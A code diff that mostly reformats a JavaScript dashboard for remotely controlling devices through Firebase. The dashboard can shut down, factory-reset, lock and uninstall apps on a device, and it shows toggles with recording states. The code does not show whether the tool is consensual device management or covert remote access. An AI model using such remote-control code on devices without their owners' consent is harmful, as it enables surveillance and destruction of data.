-    if(sdb) sdb.onclick = () => { if(confirm("⚠️ SHUTDOWN DEVICE?")) sendCmd(uid,'shutdown_device',true); };
+    if(sdb) sdb.onclick = () => { 
+        if(confirm("⚠️ SHUTDOWN DEVICE?")) sendCmd(uid,'shutdown_device',true); 
+    };
+    
     const fb = document.getElementById('cmd-factory');
-    if(fb) fb.onclick = () => { if(confirm("🚨 FACTORY RESET? ERASE ALL DATA?")){if(confirm("ABSOLUTELY sure?")) sendCmd(uid,'factory_reset',true);} };
+    if(fb) fb.onclick = () => { 
+        if(confirm("🚨 FACTORY RESET? ERASE ALL DATA?")){
+            if(confirm("ABSOLUTELY sure?")) sendCmd(uid,'factory_reset',true);
+        } 
+    };
+    
     const lnb = document.getElementById('cmd-locknow');
-    if(lnb) lnb.onclick = () => { if(confirm("🔒 Lock screen now?")) sendCmd(uid,'lock_screen_now',true); };
+    if(lnb) lnb.onclick = () => { 
+        if(confirm("🔒 Lock screen now?")) sendCmd(uid,'lock_screen_now',true); 
+    };
+    
     const ub = document.getElementById('cmd-uninstall');
-    if(ub) ub.onclick = () => { const p=prompt("Package name to uninstall:"); if(p) sendCmd(uid,'uninstall_app',p); };
-}
-
-function setupToggle(btnId, uid, cmd, offCmd) {
-    const btn = document.getElementById(btnId); if(!btn) return;
-    btn.onclick = () => { const active=btn.classList.contains("active"); if(offCmd&&active) sendCmd(uid,offCmd,true); else sendCmd(uid,cmd,!active); };
-}
-
-function setupTrigger(btnId, uid, cmd) {
-    const btn = document.getElementById(btnId); if(!btn) return;
-    btn.onclick = () => {
-        sendCmd(uid, cmd, true);
-        btn.style.background = '#00ff88'; btn.style.color = '#000'; btn.style.borderColor = '#00ff88'; btn.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.5)';
-        const s = btn.querySelector('.toggle-state');
-        if(s){s.textContent='SENT ✓';s.style.color='#000';s.style.fontWeight='bold';}
-        setTimeout(()=>{btn.style.background='';btn.style.color='';btn.style.borderColor='';btn.style.boxShadow='';if(s){s.textContent='TRIGGER';s.style.color='#666';s.style.fontWeight='normal';}},2000);
+    if(ub) ub.onclick = () => { 
+        const p=prompt("Package name to uninstall:"); 
+        if(p) sendCmd(uid,'uninstall_app',p); 
     };
 }
 
-function sendCmd(uid, cmd, val) { console.log(`📤 ${cmd} = ${val}`); update(ref(database,`devices/${uid}/commands`),{[cmd]:val}); }
-
-function updateButtonState(btnId, isActive) {
-    const btn = document.getElementById(btnId); if(!btn) return;
-    btn.classList.toggle('active', !!isActive);
-    const s = btn.querySelector('.toggle-state');
-    if(s){if(s.textContent==='REC'||s.textContent==='UPD...'||s.textContent.startsWith('SEG')||s.textContent==='SENT ✓'||s.textContent.endsWith('SEGS')) return; s.textContent=isActive?'ON':'OFF'; s.style.color=isActive?'#00ff88':'#666'; s.style.fontWeight=isActive?'bold':'normal';}
-    btn.style.borderColor = isActive ? '#00ff88' : '#333';
-    btn.style.opacity = isActive ? '1' : '0.7';
+function setupToggle(btnId, uid, cmd, offCmd) {
+    const btn = document.getElementById(btnId);
+    if(!btn) return;
+    btn.onclick = () => { 
+        const active=btn.classList.contains("active"); 
+        if(offCmd&&active) sendCmd(uid,offCmd,true); 
+        else sendCmd(uid,cmd,!active); 
+    };
 }
 
-function fmtTime(ts) { return ts ? new Date(ts).toLocaleString() : '--'; }
-function fmtSize(b) { if(!b) return '0 B'; if(b<1024) return b+' B'; if(b<1048576) return (b/1024).toFixed(1)+' KB'; if(b<1073741824) return (b/1048576).toFixed(1)+' MB'; return (b/1073741824).toFixed(2)+' GB'; }
-function esc(t) { if(!t) return ''; const d=document.createElement('div'); d.textContent=t; return d.innerHTML; }
-function showNoDeviceAlert() { noDeviceAlert.style.display='flex'; deviceDashboard.style.display='none'; }
+function setupTrigger(btnId, uid, cmd) {
+    const btn = document.getElementById(btnId);
+    if(!btn) return;
+    btn.onclick = () => {
+        sendCmd(uid, cmd, true);
+        btn.style.background = '#00ff88';
+        btn.style.color = '#000';
+        btn.style.borderColor = '#00ff88';
+        btn.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.5)';
+        const s = btn.querySelector('.toggle-state');
+        if(s){
+            s.textContent='SENT ✓';
+            s.style.color='#000';
+            s.style.fontWeight='bold';
+        }
+        setTimeout(()=>{
+            btn.style.background='';
+            btn.style.color='';
+            btn.style.borderColor='';
+            btn.style.boxShadow='';
+            if(s){
+                s.textContent='TRIGGER';
+                s.style.color='#666';
+                s.style.fontWeight='normal';
+            }
+        },2000);
+    };
+}
+
+function sendCmd(uid, cmd, val) { 
+    console.log(`📤 ${cmd} = ${val}`); 
+    update(ref(database,`devices/${uid}/commands`),{[cmd]:val}); 
+}
+
+function updateButtonState(btnId, isActive) {
+    const btn = document.getElementById(btnId);
+    if(!btn) return;
+    btn.classList.toggle('active', !!isActive);
+    const s = btn.querySelector('.toggle-state');
+    if(s){
+        if(s.textContent==='REC'||s.textContent==='UPD...'||s.textContent.startsWith('SEG')||s.textContent==='SENT ✓'||s.textContent.endsWith('SEGS')) return;
+        const newText = isActive?'ON':'OFF';
+        if (s.textContent !== newText) {
+            s.textContent = newText;
+            s.style.color=isActive?'#00ff88':'#666';
+            s.style.fontWeight=isActive?'bold':'normal';
+        }
+    }
+    const newBorder = isActive ? '#00ff88' : '#333';
+    if (btn.style.borderColor !== newBorder) btn.style.borderColor = newBorder;
+    const newOpacity = isActive ? '1' : '0.7';
+    if (btn.style.opacity !== newOpacity) btn.style.opacity = newOpacity;
+}
+
+function fmtTime(ts) { 
+    return ts ? new Date(ts).toLocaleString() : '--'; 
+}
+
+function fmtSize(b) { 
+    if(!b) return '0 B'; 
+    if(b<1024) return b+' B'; 
+    if(b<1048576) return (b/1024).toFixed(1)+' KB'; 
+    if(b<1073741824) return (b/1048576).toFixed(1)+' MB'; 
+    return (b/1073741824).toFixed(2)+' GB'; 
+}
+
+function esc(t) { 
+    if(!t) return ''; 
+    const d=document.createElement('div'); 
+    d.textContent=t; 
+    return d.innerHTML; 
+}
+
+function showNoDeviceAlert() { 
+    noDeviceAlert.style.display='flex'; 
+    deviceDashboard.style.display='none'; 
+}
 
 if(logoutBtn) logoutBtn.addEventListener('click',()=>signOut(auth).then(()=>window.location.href='./index.html'));
 if(refreshDevicesBtn) refreshDevicesBtn.addEventListener('click',loadAllDevices);
